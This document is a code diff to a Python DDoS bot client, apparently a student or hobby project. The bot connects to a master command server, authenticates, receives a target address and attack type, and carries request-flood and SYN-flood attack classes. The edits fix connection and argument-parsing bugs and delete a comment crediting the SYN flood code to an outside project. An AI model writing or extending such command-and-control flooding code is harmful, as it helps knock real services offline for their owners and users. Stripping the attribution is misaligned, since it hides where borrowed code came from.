@@ -4,6 +4,7 @@ import string
 import http.client
 import argparse
 import threading
+import select
 from random import *
 import time
 
@@ -20,14 +21,16 @@ class Bot():
 		self.authenticated = False
 		self.socket_list: list[socket.socket] = []
 		self.target_address: str = ''
-		self.attk_type: int = 0
+		self.attack_type: int = 0
 		self.attacking: bool = False
 
 		
 	def start(self):
 		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-		self.sock.connect((master_server, master_port))
-		self.sock.listen()
+		#self.sock.bind((self.host, self.port))							#seems to work without
+		self.sock.connect((self.master_server, self.master_port))
+		#self.sock.listen()												#cant listen() and connect()?
+		self.socket_list.append(self.sock)
 		print(f"connected to master server at {self.master_server}:{self.master_port}")    
 
 		try:
@@ -66,7 +69,7 @@ class Bot():
 							print("iam command error:", request[2])
 						elif request[1] == 'success': 
 							self.authenticated = True
-					elif request[0] == 'changeip':
+					elif request[0] == 'changeip':                              #did they decide to include port?
 						self.target_address = request[1]
 					elif request[0] == 'changattk':
 						self.attack_type = int(request[1])
@@ -193,10 +196,6 @@ class RequestAttack():
 			print(e)
 			sys.exit()
 			
-''' End of referenced code'''
-
-
-''' Original code from: Author: ___T7hM1___ Github: http://github.com/t7hm1/pyddos   '''
 
 class SynFloodAttack():
 	def __init__(self,target,ip):
@@ -297,13 +296,15 @@ class SynFloodAttack():
 		finally:
 			self.lock.release()
 			sys.exit()
+      
 ''' end of referenced code '''
 
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser(description = 'Bot Agent')
-	parser.add_argument('host', help='Interface the Bot connects to')
+	parser.add_argument('-a', metavar='HOST_ADDRESS', type=str,
+						default='', help='Interface the server listens at')
 	parser.add_argument('-p', metavar='PORT', type=int, default=8080,
 						help='TCP port (default 8080)')
 	args = parser.parse_args()
-	bot = Bot(args.host, args.p)
+	bot = Bot(args.a, args.p)
 	bot.start()
